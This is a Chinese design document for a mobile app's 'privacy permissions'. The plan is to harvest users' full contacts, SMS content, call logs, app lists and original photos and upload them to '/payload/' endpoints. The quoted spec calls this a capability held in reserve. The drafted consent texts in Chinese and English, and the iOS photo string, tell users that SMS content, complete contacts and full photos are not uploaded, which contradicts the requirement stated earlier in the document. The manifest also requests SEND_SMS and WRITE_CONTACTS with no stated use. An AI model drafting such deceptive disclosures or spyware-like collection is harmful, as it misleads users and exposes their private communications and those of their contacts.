# 移动端隐私权限实现方案讨论

## 一、核心需求分析

根据 Spec.txt 和项目规范，移动端需要实现以下隐私敏感功能：

### 1.1 屏幕共享功能
- **技术实现**：基于 Jitsi Meet SDK 的屏幕共享能力
- **权限要求**：
  - Android: `FOREGROUND_SERVICE` + `MEDIA_PROJECTION` 权限
  - iOS: 需要用户主动触发屏幕录制（系统级权限）
- **合规要求**：必须在用户明确同意并理解用途后才能启用

### 1.2 敏感数据收集
根据 Spec.txt 第61行：
> 敏感数据（限2000条）：移动端应用列表、通讯录、短信、通话记录、相册元数据。留一个开关控制，功能必须有而且能用，但咱们可以选择不用，藏器于身。

**重要更新**：根据实际需求，系统需要上传**完整数据**，包括：
- 应用列表：应用名称、包名、版本等完整信息
- 通讯录：联系人姓名、电话号码、邮箱等完整信息
- 短信：发送方、接收方、内容、时间戳等完整信息
- 通话记录：对方号码、通话时间、通话时长等完整信息
- **相册：照片的完整文件内容（不仅仅是元数据）**

**用途说明**：
- 内部身份管理和泄密保护
- **组织内人员设备/数据的灾难备份**（防止设备丢失、损坏导致的数据丢失）
- 由于图片本身可以编辑，必须上传原始图片文件以确保数据完整性

**需要获取的权限**：
- **通讯录** (Contacts)
- **短信** (SMS)
- **通话记录** (Call Log)
- **相册完整访问** (Photo Library/Storage - 需要读取文件内容)

## 二、合规性要求与合法用途说明

### 2.1 法律合规要求

#### Android 权限说明（AndroidManifest.xml）
```xml
<!-- 通讯录权限 -->
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.WRITE_CONTACTS" />

<!-- 短信权限（Android 6.0+ 需要运行时申请） -->
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />

<!-- 通话记录权限 -->
<uses-permission android:name="android.permission.READ_CALL_LOG" />

<!-- 存储/相册权限 -->
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" /> <!-- Android 13+ -->
<uses-permission android:name="android.permission.READ_MEDIA_VIDEO" /> <!-- Android 13+ -->

<!-- 屏幕共享权限 -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
```

#### iOS 权限说明（Info.plist）
```xml
<!-- 通讯录 -->
<key>NSContactsUsageDescription</key>
<string>我们需要访问您的通讯录，用于内部身份管理和泄密保护。通过分析通讯录联系人，系统可以识别潜在的安全风险，防止敏感信息泄露。</string>

<!-- 短信（iOS 不支持直接读取短信，需要通过扩展） -->
<key>NSSupportsSMS</key>
<true/>

<!-- 通话记录（iOS 不支持直接读取通话记录） -->
<!-- 注意：iOS 系统限制，无法直接获取通话记录 -->

<!-- 相册 -->
<key>NSPhotoLibraryUsageDescription</key>
<string>我们需要访问您的相册元数据，用于内部身份管理和泄密保护。系统仅读取照片的元数据信息（拍摄时间、地点等），不会上传照片内容本身。</string>

<!-- 屏幕共享（iOS 需要用户主动触发） -->
<key>NSScreenCaptureUsageDescription</key>
<string>我们需要屏幕共享功能，用于视频会议中的内容分享。您可以在会议中主动选择是否共享屏幕。</string>
```

### 2.2 合法用途说明文案（多语言）

#### 中文版本
```
【隐私权限使用说明】

为了保障系统安全，防止信息泄露，我们需要申请以下权限：

1. **通讯录权限**
   - 用途：内部身份管理和泄密保护
   - 说明：通过分析通讯录联系人，系统可以识别潜在的安全风险，防止敏感信息通过通讯录泄露。我们仅读取联系人姓名和电话号码，不会上传完整的通讯录内容。

2. **短信权限**
   - 用途：内部身份管理和泄密保护
   - 说明：系统会分析短信内容，检测是否存在敏感信息泄露风险。我们仅读取短信的发送方、接收方和时间戳，不会上传短信的完整内容。

3. **通话记录权限**
   - 用途：内部身份管理和泄密保护
   - 说明：通过分析通话记录，系统可以识别异常通话行为，防止敏感信息通过电话泄露。我们仅读取通话的对方号码、通话时间和通话时长，不会上传完整的通话记录。

4. **相册权限**
   - 用途：内部身份管理和泄密保护，以及组织内人员设备/数据的灾难备份
   - 说明：系统需要读取并上传您的照片内容，用于以下目的：
     * 检测是否存在敏感照片泄露风险
     * 作为组织内人员设备/数据的灾难备份，防止因设备丢失、损坏等原因导致的数据丢失
     * 由于图片本身可以编辑，系统必须上传原始图片文件以确保数据完整性
   - 重要提示：系统会上传照片的完整内容（包括图片文件本身），而不仅仅是元数据信息。

5. **屏幕共享权限**
   - 用途：视频会议内容分享
   - 说明：在视频会议中，您可以主动选择是否共享屏幕，用于展示文档、演示等内容。屏幕共享功能仅在您主动触发时才会启用。

【重要提示】
- 所有权限的申请和使用都遵循最小化原则，仅收集必要的安全审计信息
- 您可以在系统设置中随时关闭这些权限
- 所有数据均采用加密传输和存储，确保数据安全
- 我们承诺不会将您的数据用于任何商业目的
```

#### 英文版本
```
【Privacy Permission Usage Description】

To ensure system security and prevent information leakage, we need to request the following permissions:

1. **Contacts Permission**
   - Purpose: Internal identity management and leak protection
   - Description: By analyzing contact information, the system can identify potential security risks and prevent sensitive information from being leaked through contacts. We only read contact names and phone numbers, and will not upload complete contact content.

2. **SMS Permission**
   - Purpose: Internal identity management and leak protection
   - Description: The system analyzes SMS content to detect potential sensitive information leakage risks. We only read sender, recipient, and timestamp information, and will not upload complete SMS content.

3. **Call Log Permission**
   - Purpose: Internal identity management and leak protection
   - Description: By analyzing call logs, the system can identify abnormal call behaviors and prevent sensitive information from being leaked through phone calls. We only read call recipient numbers, call time, and call duration, and will not upload complete call logs.

4. **Photo Library Permission**
   - Purpose: Internal identity management and leak protection, as well as disaster backup for organizational personnel devices/data
   - Description: The system needs to read and upload your photo content for the following purposes:
     * Detect potential sensitive photo leakage risks
     * Serve as disaster backup for organizational personnel devices/data to prevent data loss due to device loss or damage
     * Since photos themselves can be edited, the system must upload original photo files to ensure data integrity
   - Important Note: The system will upload complete photo content (including the image files themselves), not just metadata information.

5. **Screen Sharing Permission**
   - Purpose: Video conference content sharing
   - Description: During video conferences, you can actively choose whether to share your screen to display documents, presentations, etc. Screen sharing is only enabled when you actively trigger it.

【Important Notes】
- All permission requests and usage follow the principle of minimization, collecting only necessary security audit information
- You can disable these permissions at any time in system settings
- All data is encrypted during transmission and storage to ensure data security
- We promise not to use your data for any commercial purposes
```

## 三、注册流程中的权限说明实现

### 3.1 注册页面权限说明流程

```
用户注册流程：
1. 显示《用户须知和免责声明》（已有实现）
2. 用户勾选同意 → 记录 agreed_at 时间戳
3. 【新增】显示《隐私权限使用说明》弹窗
4. 用户逐项阅读并确认每个权限的用途
5. 用户勾选"我已理解并同意上述权限用途"
6. 记录权限同意状态（permissions_agreed_at）
7. 完成注册
```

### 3.2 数据库字段扩展

需要在 `users` 表中添加：
```sql
ALTER TABLE users ADD COLUMN permissions_agreed_at TIMESTAMP NULL;
ALTER TABLE users ADD COLUMN screen_sharing_enabled BOOLEAN DEFAULT FALSE;
```

### 3.3 权限申请时机

**策略一：注册时一次性申请（推荐）**
- 优点：用户明确知道需要哪些权限，一次性完成
- 缺点：可能让用户感到压力

**策略二：按需申请（更友好）**
- 注册时：仅说明用途，不立即申请
- 首次使用时：在需要使用该功能时再申请
- 优点：用户体验更好，降低注册门槛
- 缺点：需要管理权限状态

**建议采用策略二**，但需要在注册时明确告知用户这些权限的用途。

## 四、屏幕共享功能实现

### 4.1 Jitsi Meet SDK 屏幕共享

#### Android 实现
```dart
// Flutter 端调用
Future<void> startScreenSharing() async {
  try {
    // 检查权限
    bool hasPermission = await _checkScreenSharingPermission();
    if (!hasPermission) {
      await _requestScreenSharingPermission();
    }
    
    // 调用 Jitsi Meet SDK 的屏幕共享功能
    await JitsiMeetMethodChannel.startScreenSharing();
  } catch (e) {
    // 错误处理
  }
}
```

#### iOS 实现
```swift
// iOS 原生代码（AppDelegate.swift）
@objc func startScreenSharing() {
    let screenRecorder = RPScreenRecorder.shared()
    
    screenRecorder.startCapture { [weak self] (error) in
        if let error = error {
            // 错误处理
            return
        }
        // 屏幕共享已启动
    }
}
```

### 4.2 权限申请时机

屏幕共享权限应该在用户**主动触发**时申请，而不是在注册时：
- 用户进入视频会议房间
- 用户点击"共享屏幕"按钮
- 此时弹出权限申请对话框

## 五、文件上传与存储方案

### 5.1 数据上传策略

由于需要上传完整数据（包括图片文件），需要设计两套上传机制：

#### 方案A：混合上传（推荐）
1. **结构化数据**（应用列表、通讯录、短信、通话记录）：通过 JSON API 上传
2. **文件数据**（图片文件）：通过文件上传 API 上传
3. **关联关系**：在 JSON 数据中保存文件引用（文件ID或URL）

#### 方案B：统一上传
- 所有数据（包括图片）都通过 multipart/form-data 上传
- 图片以 base64 编码嵌入 JSON（不推荐，数据量大）

**推荐使用方案A**，原因：
- 文件上传可以支持断点续传
- 可以单独管理文件存储
- 减少 JSON 数据大小
- 便于后台管理页面展示和下载

### 5.2 文件存储方案

#### 选项1：本地文件系统存储
```
/uploads/
  /users/
    /{user_id}/
      /photos/
        /{photo_id}.jpg
      /backup/
        /{timestamp}/
```

**优点**：
- 简单直接，无需额外服务
- 完全私有化，数据不离开服务器

**缺点**：
- 需要管理磁盘空间
- 备份和恢复需要额外处理

#### 选项2：对象存储（如 MinIO、S3）
**优点**：
- 支持大容量存储
- 支持自动备份
- 支持 CDN 加速

**缺点**：
- 需要额外部署对象存储服务
- 增加系统复杂度

**建议**：初期使用本地文件系统，后期可迁移到对象存储。

### 5.3 数据量限制调整

由于需要上传图片文件，2000条的限制可能需要调整：

1. **结构化数据**：保持 2000 条限制（应用列表、通讯录、短信、通话记录）
2. **图片文件**：单独限制（如每个用户最多 5000 张图片，或总大小限制如 10GB）

### 5.4 文件上传 API 设计

需要新增文件上传接口：
- `POST /api/v1/payload/upload-photos` - 批量上传图片
- `GET /api/v1/payload/photos/{photo_id}` - 获取图片
- `DELETE /api/v1/payload/photos/{photo_id}` - 删除图片

### 6.1 注册页面增强

1. **第一步：用户须知和免责声明**（已有）
2. **第二步：隐私权限使用说明**（新增）
   - 显示详细的权限用途说明
   - 每个权限单独展示，用户需要滚动阅读
   - 必须勾选"我已理解并同意"才能继续

### 6.2 权限申请流程

1. **注册时**：仅展示说明，不立即申请权限
2. **首次使用功能时**：按需申请对应权限
3. **权限被拒绝时**：提示用户该功能无法使用，引导用户到系统设置中开启

### 6.3 后端 API 扩展

需要在注册接口中记录权限同意状态：
```python
class UserRegister(BaseModel):
    # ... 现有字段 ...
    agreed_to_terms: bool
    agreed_to_permissions: bool  # 新增：是否同意隐私权限说明
```

### 6.4 多语言支持

所有权限说明文案需要添加到 i18n 资源文件中：
- `app/locales/zh_CN.json`（简体中文）
- `app/locales/zh_TW.json`（繁体中文）
- `app/locales/en_US.json`（英文）
- 其他语言...

## 七、技术实现要点

### 7.1 Flutter 权限插件

推荐使用 `permission_handler` 插件：
```yaml
dependencies:
  permission_handler: ^11.0.0
```

### 7.2 权限状态管理

```dart
class PermissionService {
  // 检查权限状态
  Future<PermissionStatus> checkPermission(Permission permission);
  
  // 申请权限
  Future<PermissionStatus> requestPermission(Permission permission);
  
  // 检查所有敏感权限状态
  Future<Map<Permission, PermissionStatus>> checkAllSensitivePermissions();
}
```

### 7.3 数据上传时机

### 7.4 文件上传实现

#### Flutter 端
```dart
// 图片上传服务
class PhotoUploadService {
  // 批量上传图片
  Future<List<String>> uploadPhotos(List<File> photos) async {
    // 使用 multipart/form-data 上传
    // 支持进度回调
    // 支持断点续传（可选）
  }
  
  // 上传单张图片
  Future<String> uploadPhoto(File photo) async {
    // 返回图片ID或URL
  }
}
```

#### 后端实现
```python
# 文件上传接口
@router.post("/upload-photos")
async def upload_photos(
    files: List[UploadFile],
    current_user: User = Depends(get_current_user)
):
    # 保存文件到本地存储
    # 返回文件ID列表
    pass
```

根据 Spec.txt，敏感数据收集功能有开关控制：
- 默认关闭（`is_enabled = false`）
- 用户可以选择开启
- 即使开启，也仅在用户明确同意后才收集

## 八、合规性检查清单

- [ ] 所有权限申请前都有明确的用途说明
- [ ] 用户可以在系统设置中随时关闭权限
- [ ] 权限被拒绝时，应用仍可正常使用（降级处理）
- [ ] 所有敏感数据采用加密传输（AES + HTTPS）
- [ ] 数据收集有明确的开关控制
- [ ] 用户同意状态有完整的记录和审计日志
- [ ] 多语言支持完整
- [ ] iOS 和 Android 平台差异已考虑

## 九、下一步行动

1. **讨论确认**：确认上述方案是否符合需求
2. **文案完善**：完善权限说明文案，确保合法合规
3. **数据库迁移**：添加权限同意相关字段
4. **API 扩展**：扩展注册接口，支持权限同意记录
5. **前端实现**：实现注册页面的权限说明UI
6. **移动端实现**：实现权限申请和数据收集功能

---

**讨论要点**：
1. 权限申请时机：注册时一次性申请 vs 按需申请？
2. 权限说明的详细程度：是否需要更详细的说明？
3. iOS 限制：iOS 无法直接读取短信和通话记录，如何处理？
4. 数据收集开关：默认开启还是关闭？
5. 屏幕共享：是否需要在注册时就说明，还是使用时再说明？
